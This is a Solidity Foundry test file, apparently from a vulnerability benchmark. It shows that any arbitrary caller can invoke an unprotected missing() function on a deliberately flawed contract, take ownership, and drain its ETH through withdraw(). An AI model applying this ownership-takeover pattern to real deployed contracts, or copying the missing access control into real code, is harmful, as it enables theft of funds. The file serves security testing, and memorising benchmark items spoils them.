
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_2} from "../src/Missing_2.sol";

contract TestAccessControlMissing_2 is Test {
    Missing_2 private target;

    function setUp() public {
        target = new Missing_2();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Note: We do NOT exclude any privileged roles here because the vulnerability
        // is that the missing() function has NO access control at all.
        // Any arbitrary user can call it and become the owner.

        // --- 2. State Configuration ---
        // Fund the contract with some ETH to make the vulnerability impactful
        vm.deal(address(target), 1 ether);
        
        // Fund the caller for gas
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected missing() function - this should succeed for any caller
        // This is the vulnerability: any user can call missing() and become the owner
        target.missing();

        // Verify the caller is now the owner by attempting to withdraw
        // If the caller successfully became owner, withdraw() should succeed
        vm.prank(caller);
        target.withdraw();

        // Assert that the contract balance is now 0 (funds were withdrawn by arbitrary caller)
        assertEq(address(target).balance, 0, "Arbitrary caller should have drained the contract");
        
        // Assert that the caller received the funds
        assertEq(caller.balance, 2 ether, "Caller should have received the contract's ETH");
    }
}
